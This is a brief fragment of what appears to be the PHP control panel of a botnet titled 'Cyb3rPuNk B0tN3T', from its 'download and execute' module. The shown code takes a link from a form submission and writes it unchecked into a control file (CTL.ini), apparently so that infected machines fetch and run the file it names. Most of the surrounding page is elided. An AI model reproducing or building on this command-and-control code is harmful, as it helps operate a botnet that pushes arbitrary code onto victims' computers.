...
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: DOWNLOAD AND EXECUTE</title>
...
///////////////////////////////////////////////////////////
	...
	$buf = "[DWCTL]\nLNK=". $_POST["lnk"] ."\n";
	$file = fopen("modulos/dowexec/CTL.ini", "w");
	$wt = fwrite($file, $buf);
	fclose($file);
